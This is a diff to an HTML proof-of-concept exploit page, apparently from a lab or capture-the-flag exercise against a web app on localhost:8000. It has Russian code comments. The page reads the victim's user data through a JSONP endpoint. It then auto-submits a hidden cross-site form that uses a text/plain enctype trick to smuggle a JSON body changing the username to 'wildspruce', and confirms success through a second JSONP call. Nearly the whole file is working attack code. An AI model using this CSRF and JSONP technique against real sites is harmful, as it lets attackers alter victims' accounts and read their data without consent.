@@ -5,42 +5,54 @@
 </head>
 <body>
   <iframe name="hiddenFrame" style="display:none;"></iframe>
-  <form id="postForm" method="POST" action="http://localhost:8000/api/whoami" target="hiddenFrame">
-    <input type="hidden" name="new_username" value="wildspruce">
+
+  <form id="postForm" method="POST" action="http://localhost:8000/api/whoami" target="hiddenFrame" enctype="text/plain">
+    <input type="hidden" name='{"new_username":"wildspruce","ignore":"' value='"}'>
   </form>
 
   <script>
     function exploit(data) {
       console.log("[EXPLOIT] User data BEFORE:", data);
-      document.body.innerHTML += '<h1 style="color:red;">EXPLOIT STARTED</h1>';
+      document.body.innerHTML = '<h1 style="color:red;">EXPLOIT STARTED (GUEST MODE)</h1>';
       document.body.innerHTML += '<p>Username before: ' + data.username + '</p>';
+      document.body.innerHTML += '<p>Role: ' + data.role + '</p>';
 
-      console.log("[EXPLOIT] Step 1: Navigate to #/sheets");
+      // Шаг 1: Переход на #/sheets
       window.location.hash = '#/sheets';
+      document.body.innerHTML += '<p>✓ Step 1: Navigated to #/sheets</p>';
 
       setTimeout(() => {
-        console.log("[EXPLOIT] Step 2: Submitting POST form");
+        // Шаг 2: Отправляем форму с JSON через text/plain trick
+        console.log("[EXPLOIT] Submitting form...");
         document.getElementById('postForm').submit();
-        document.body.innerHTML += '<h2>POST SUBMITTED</h2>';
+        document.body.innerHTML += '<p>✓ Step 2: Form submitted</p>';
 
         setTimeout(() => {
+          // Шаг 3: Проверяем через JSONP, изменился ли username
           window.checkResult = function(updatedData) {
             console.log("[EXPLOIT] User data AFTER:", updatedData);
-            document.body.innerHTML += '<h2 style="color:green;">Username after: ' + updatedData.username + '</h2>';
+            document.body.innerHTML += '<h2 style="color:green;">✓ Username after: ' + updatedData.username + '</h2>';
 
-            console.log("[EXPLOIT] Step 4: Navigate to #/settings");
+            // Шаг 4: Переход на #/settings
             window.location.hash = '#/settings';
-            document.body.innerHTML += '<h2>NAVIGATED TO SETTINGS</h2>';
+            document.body.innerHTML += '<p>✓ Step 3: Navigated to #/settings</p>';
+
+            if (updatedData.username === 'wildspruce') {
+              document.body.innerHTML += '<h2 style="color:green;">🎉 EXPLOIT COMPLETE! 🎉</h2>';
+            } else {
+              document.body.innerHTML += '<h2 style="color:red;">EXPLOIT FAILED - username not changed</h2>';
+            }
           };
 
           const script = document.createElement('script');
           script.src = 'http://localhost:8000/api/whoami/jsonp?callback=checkResult';
           document.body.appendChild(script);
         }, 1000);
-      }, 1000);
+      }, 500);
     }
   </script>
 
+  <!-- JSONP запрос, который вызовет функцию exploit -->
   <script src="http://localhost:8000/api/whoami/jsonp?callback=exploit"></script>
 </body>
 </html>
